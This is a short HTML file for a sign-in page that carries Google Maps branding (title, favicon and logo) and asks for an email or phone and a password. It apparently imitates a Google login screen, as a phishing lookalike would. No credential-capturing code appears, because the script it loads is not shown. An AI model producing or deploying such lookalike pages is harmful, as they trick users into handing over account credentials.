<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <!-- Quan trọng -->
  <title>Google Maps</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" type="image/png">
</head>
<body>
  <div class="login-container">
    <img src="https://cdn-icons-png.flaticon.com/512/281/281764.png" class="logo" alt="Logo">
    <h2>Sign in</h2>
    <p>Please sign in to continue to the app.</p>
    <form id="loginForm" method="POST">
      <input type="email" placeholder="Email or phone" required>
      <input type="password" placeholder="Password" required>
      <button class="btn" type="submit">Next</button>
    </form>
    <div class="footer-links">
      <a href="#">Create account</a>
      <a href="#">Forgot password?</a>
    </div>
  </div>
  <script src="script.js"></script>
</body>
</html>
